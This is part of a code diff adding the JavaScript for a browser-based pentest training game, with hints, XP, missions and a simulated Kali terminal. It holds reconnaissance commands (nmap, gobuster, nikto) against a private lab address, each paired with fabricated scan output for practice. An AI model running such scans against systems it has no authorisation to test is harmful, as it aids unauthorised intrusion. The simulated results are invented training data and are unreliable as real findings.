+                    addTerminalOutput("Answer already revealed: " + activeObjective.requiredCommand, "answer");
+                }
+            } else {
+                // Show next hint
+                const hintIndex = activeObjective.hintsUsed;
+                activeObjective.hintsUsed++;
+                addTerminalOutput(`Hint ${hintIndex + 1}/${activeObjective.hints.length}: ${activeObjective.hints[hintIndex]}`, "hint");
+                
+                // Update objectives display
+                renderObjectives();
+                
+                // If last hint, show that next will be answer
+                if (activeObjective.hintsUsed === activeObjective.hints.length) {
+                    addTerminalOutput("Next 'hint' command will reveal the answer.", "info");
+                }
+            }
+        }
+
+        // Check if command completes an objective
+        function checkObjectiveCompletion(command) {
+            const activeObjective = objectives.find(obj => obj.active && !obj.completed);
+            
+            if (activeObjective && activeObjective.requiredCommand === command) {
+                // Complete the objective
+                activeObjective.completed = true;
+                activeObjective.active = false;
+                
+                // Award XP
+                gameState.xp += activeObjective.xpReward;
+                gameState.vulnerabilitiesFound++;
+                
+                // Show completion message
+                addTerminalOutput(`Mission Complete: ${activeObjective.name}! +${activeObjective.xpReward} Reputation`, "success");
+                showAchievement("Penetration Success", `Completed: ${activeObjective.name}`);
+                
+                // Activate next objective if available
+                const nextObjective = objectives.find(obj => !obj.completed && !obj.active);
+                if (nextObjective) {
+                    nextObjective.active = true;
+                    addTerminalOutput(`New Mission Available: ${nextObjective.name}`, "info");
+                    addTerminalOutput(`Objective: ${nextObjective.description}`, "info");
+                }
+                
+                // Update objectives display
+                renderObjectives();
+                
+                return true; // Objective was completed
+            }
+            
+            return false; // No objective completed
+        }
+
+        // Show simulated output for a command
+        function showCommandOutput(cmdObj) {
+            let output = "";
+            
+            // Generate simulated output based on command
+            switch(cmdObj.command) {
+                case "nmap -sS -sV -O 192.168.1.100":
+                    output = `Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-15 14:30 UTC
+Nmap scan report for 192.168.1.100
+Host is up (0.045s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2
+80/tcp   open  http        Apache httpd 2.4.29 ((Debian))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+3306/tcp open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1
+8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 00:0C:29:AA:BB:CC (VMware)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`;
+                    break;
+                    
+                case "gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt":
+                    output = `===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.1.100
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2023/10/15 14:35:12 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/admin                (Status: 301) [Size: 317] [--> http://192.168.1.100/admin/]
+/backup               (Status: 301) [Size: 318] [--> http://192.168.1.100/backup/]
+/cgi-bin/             (Status: 301) [Size: 320] [--> http://192.168.1.100/cgi-bin/]
+/index.html           (Status: 200) [Size: 10701]
+/server-status        (Status: 403) [Size: 278]
+===============================================================
+2023/10/15 14:35:42 Finished
+===============================================================`;
+                    addTerminalOutput("Interesting directories found: /admin, /backup, /cgi-bin/", "info");
+                    break;
+                    
+                case "nikto -h http://192.168.1.100":
+                    output = `- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.100
++ Target Hostname:    192.168.1.100
++ Target Port:        80
++ Start Time:         2023-10-15 14:40:12
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Debian)
++ Retrieved x-powered-by header: PHP/7.3.19
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined.
++ The X-Content-Type-Options header is not set.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7535 requests: 0 error(s) and 7 item(s) reported on remote host
++ End Time:           2023-10-15 14:42:05 (113 seconds)
+---------------------------------------------------------------------------`;
+                    addTerminalOutput("Vulnerabilities found: Missing security headers, directory indexing enabled", "info");
+                    break;
+                    
+                default:
+                    output = `Command '${cmdObj.command}' executed successfully.
+Output simulated for training purposes.`;
+            }
+            
+            addTerminalOutput(output, "cmd-output");
+        }
+
+        // Check if player has leveled up
+        function checkLevelUp() {
+            if (gameState.xp >= gameState.xpToNextLevel) {
+                gameState.level++;
+                gameState.xpToNextLevel = Math.floor(gameState.xpToNextLevel * 1.5);
+                
+                // Update role if needed
+                const newRole = gameState.roles
+                    .filter(role => role.xpRequired <= gameState.xp)
+                    .reduce((prev, current) => (prev.xpRequired > current.xpRequired) ? prev : current);
+                
+                if (newRole.name !== gameState.currentRole) {
+                    gameState.currentRole = newRole.name;
+                    showAchievement("Promotion!", `New Role: ${gameState.currentRole}`, "level-up");
+                } else {
+                    showAchievement("Skill Level Up!", `You've reached level ${gameState.level}`, "level-up");
+                }
+                
+                // Update stats
+                updateStats();
+            }
+        }
+
+        // Show achievement toast
+        function showAchievement(title, description, className = "") {
+            toastTitle.textContent = title;
+            toastDesc.textContent = description;
+            
+            // Add class if provided
+            achievementToast.className = "achievement-toast";
+            if (className) {
+                achievementToast.classList.add(className);
+            }
+            
+            // Show the toast
+            achievementToast.classList.add("show");
+            
+            // Hide after 5 seconds
+            setTimeout(() => {
+                achievementToast.classList.remove("show");
+                if (className) {
+                    achievementToast.classList.remove(className);
+                }
+            }, 5000);
+        }
+
+        // Update stats display
+        function updateStats() {
+            document.getElementById('level').textContent = gameState.level;
+            document.getElementById('xp').textContent = gameState.xp;
+            document.getElementById('exploits-used').textContent = gameState.exploitsUsed;
+            document.getElementById('vulnerabilities-found').textContent = gameState.vulnerabilitiesFound;
+            
+            // Calculate success rate
+            const successRate = gameState.totalAttempts > 0 ? 
+                Math.round((gameState.correctAttempts / gameState.totalAttempts) * 100) : 100;
+            document.getElementById('success-rate').textContent = `${successRate}%`;
+            
+            document.getElementById('next-level-xp').textContent = gameState.xpToNextLevel;
+            
+            // Update XP progress bar
+            const xpProgress = Math.min(100, (gameState.xp / gameState.xpToNextLevel) * 100);
+            document.getElementById('xp-progress').style.width = `${xpProgress}%`;
+            
+            document.getElementById('current-role').textContent = gameState.currentRole;
+        }
+
+        // Add output to terminal
+        function addTerminalOutput(text, className = "") {
+            const outputLine = document.createElement('pre');
+            outputLine.className = 'terminal-line';
+            
+            const output = document.createElement('span');
+            output.className = `cmd-output ${className}`;
+            output.textContent = text;
+            
+            outputLine.appendChild(output);
+            terminal.appendChild(outputLine);
+            
+            // Scroll to bottom
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        // Game command: help
+        function showHelp() {
+            addTerminalOutput("Available Commands:", "info");
+            addTerminalOutput("  help        - Show this help message", "cmd-output");
+            addTerminalOutput("  missions    - List active pentest missions", "cmd-output");
+            addTerminalOutput("  commands    - Show red team command reference", "cmd-output");
+            addTerminalOutput("  stats       - Display your pentester profile", "cmd-output");
+            addTerminalOutput("  clear       - Clear the terminal", "cmd-output");
+            addTerminalOutput("  hint        - Get a hint for current mission (up to 3)", "cmd-output");
+            addTerminalOutput("", "cmd-output");
+            addTerminalOutput("Type any red team command to execute it and earn reputation", "info");
+        }
+
+        // Game command: objectives
+        function showObjectives() {
+            addTerminalOutput("Active Pentest Missions:", "info");
+            objectives.forEach(obj => {
+                if (obj.active || obj.completed) {
+                    const status = obj.completed ? "✓" : obj.active ? "→" : "○";
+                    addTerminalOutput(`  ${status} ${obj.name}: ${obj.description} (${obj.xpReward} Rep)`, "cmd-output");
+                }
+            });
+        }
+
+        // Game command: commands
+        function showCommandReference() {
+            addTerminalOutput("Red Team Command Reference:", "info");
+            redTeamCommands.forEach(cmd => {
+                addTerminalOutput(`  ${cmd.command}`, "cmd-output");
+                addTerminalOutput(`    ${cmd.description}`, "cmd-output");
+            });
+        }
+
+        // Game command: stats
+        function showStats() {
+            addTerminalOutput("Pentester Profile:", "info");
+            addTerminalOutput(`  Skill Level: ${gameState.level}`, "cmd-output");
+            addTerminalOutput(`  Reputation: ${gameState.xp}/${gameState.xpToNextLevel}`, "cmd-output");
+            addTerminalOutput(`  Exploits Used: ${gameState.exploitsUsed}`, "cmd-output");
+            addTerminalOutput(`  Vulnerabilities Found: ${gameState.vulnerabilitiesFound}`, "cmd-output");
+            addTerminalOutput(`  Current Role: ${gameState.currentRole}`, "cmd-output");
+        }
+
+        // Game command: clear
+        function clearTerminal() {
+            while (terminal.firstChild) {
+                terminal.removeChild(terminal.firstChild);
+            }
+            
+            // Add new input line after clearing
+            const newInputLine = document.createElement('div');
+            newInputLine.className = 'terminal-line';
+            const newPrompt = document.createElement('span');
+            newPrompt.className = 'terminal-prompt';
+            newPrompt.textContent = 'pentester@kali:~$ ';
+            const newInput = document.createElement('input');
+            newInput.className = 'terminal-input';
+            newInput.type = 'text';
+            
+            newInputLine.appendChild(newPrompt);
+            newInputLine.appendChild(newInput);
+            terminal.appendChild(newInputLine);
+            
+            // Set up event listener for new input
+            input = newInput;
+            inputLine = newInputLine;
+            input.addEventListener('keydown', handleInput);
+            input.focus();
+            
+            // Add back the header
+            addTerminalOutput("=== Red Team Pentester Terminal ===", "info");
+        }
+
+        // Render objectives panel with hint system
+        function renderObjectives() {
+            const container = document.getElementById('objectives-container');
+            container.innerHTML = '';
+            
+            objectives.forEach(obj => {
+                if (obj.active || obj.completed) {
+                    const objectiveEl = document.createElement('div');
+                    objectiveEl.className = 'objective-item';
+                    if (obj.completed) objectiveEl.classList.add('completed');
+                    if (obj.active) objectiveEl.classList.add('active');
+                    
+                    let hintsHTML = '';
+                    if (obj.active) {
+                        hintsHTML = '<div class="hints-container">';
+                        for (let i = 0; i < obj.hints.length; i++) {
+                            const hintClass = i < obj.hintsUsed ? 'used visible' : '';
+                            hintsHTML += `<div class="hint-item ${hintClass}">${obj.hints[i]}</div>`;
+                        }
+                        if (obj.answerRevealed) {
+                            hintsHTML += `<div class="hint-item answer visible">${obj.requiredCommand}</div>`;
+                        }
+                        hintsHTML += `<button class="hint-button" onclick="requestHint(${obj.id})" ${obj.hintsUsed >= obj.hints.length ? 'disabled' : ''}>Get Hint (${obj.hintsUsed}/${obj.hints.length})</button>`;
+                        hintsHTML += '</div>';
+                    }
+                    
+                    objectiveEl.innerHTML = `
+                        <div class="objective-header">
+                            <div class="objective-name">${obj.name}</div>
+                            <div class="objective-xp">${obj.xpReward} Rep</div>
+                        </div>
+                        <div class="objective-desc">${obj.description}</div>
+                        ${hintsHTML}
+                    `;
+                    
+                    container.appendChild(objectiveEl);
+                    
+                    // Auto-scroll to active mission
+                    if (obj.active) {
+                        setTimeout(() => {
+                            objectiveEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                        }, 100);
+                    }
+                }
+            });
+        }
+
+        // Request hint for specific objective
+        function requestHint(objectiveId) {
+            const objective = objectives.find(obj => obj.id === objectiveId);
+            if (objective && objective.active) {
+                giveHint();
+            }
+        }
+
+        // Render command reference panel
+        function renderCommandReference() {
+            const container = document.getElementById('command-reference');
+            container.innerHTML = '';
+            
+            // Group commands by category
+            const commandsByCategory = {};
+            redTeamCommands.forEach(cmd => {
+                if (!commandsByCategory[cmd.category]) {
+                    commandsByCategory[cmd.category] = [];
+                }
+                commandsByCategory[cmd.category].push(cmd);
+            });
+            
+            // Create content for each category
+            Object.keys(commandsByCategory).forEach(category => {
+                const categoryDiv = document.createElement('div');
+                categoryDiv.className = 'command-category';
+                categoryDiv.textContent = category.replace('_', ' ').toUpperCase();
+                container.appendChild(categoryDiv);
+                
+                commandsByCategory[category].forEach(cmd => {
+                    const commandDiv = document.createElement('div');
+                    commandDiv.className = 'command-item';
+                    commandDiv.innerHTML = `
+                        <div class="command-name">${cmd.command}</div>
+                        <div class="command-desc">${cmd.description}</div>
+                    `;
+                    container.appendChild(commandDiv);
+                });
+            });
+        }
+
+        // Switch between terminal tabs
+        function switchTab(tabName) {
+            // Update tab appearance
+            document.querySelectorAll('.terminal-tab').forEach(tab => tab.classList.remove('active'));
+            event.target.classList.add('active');
+            
+            // Show/hide content
+            if (tabName === 'terminal') {
+                document.getElementById('terminal').style.display = 'block';
+                document.getElementById('commands-reference').classList.remove('active');
+            } else if (tabName === 'commands') {
+                document.getElementById('terminal').style.display = 'none';
+                document.getElementById('commands-reference').classList.add('active');
+                renderCommandsTab();
+            }
+        }
+
+        // Render commands reference in tab
+        function renderCommandsTab() {
+            const container = document.getElementById('commands-reference');
+            container.innerHTML = '';
+            
+            // Group commands by category
+            const commandsByCategory = {};
+            redTeamCommands.forEach(cmd => {
+                if (!commandsByCategory[cmd.category]) {
+                    commandsByCategory[cmd.category] = [];
+                }
+                commandsByCategory[cmd.category].push(cmd);
+            });
+            
+            // Create content for each category
+            Object.keys(commandsByCategory).forEach(category => {
+                const categoryDiv = document.createElement('div');
+                categoryDiv.className = 'command-category';
+                categoryDiv.textContent = category.replace('_', ' ').toUpperCase();
+                container.appendChild(categoryDiv);
+                
+                commandsByCategory[category].forEach(cmd => {
+                    const commandDiv = document.createElement('div');
+                    commandDiv.className = 'command-item';
+                    commandDiv.innerHTML = `
+                        <div class="command-name">${cmd.command}</div>
+                        <div class="command-desc">${cmd.description}</div>
+                    `;
+                    container.appendChild(commandDiv);
+                });
+            });
+        }
+
+        // Initialize the game when page loads
+        window.addEventListener('DOMContentLoaded', initGame);
+    </script>
+</body>
+</html>
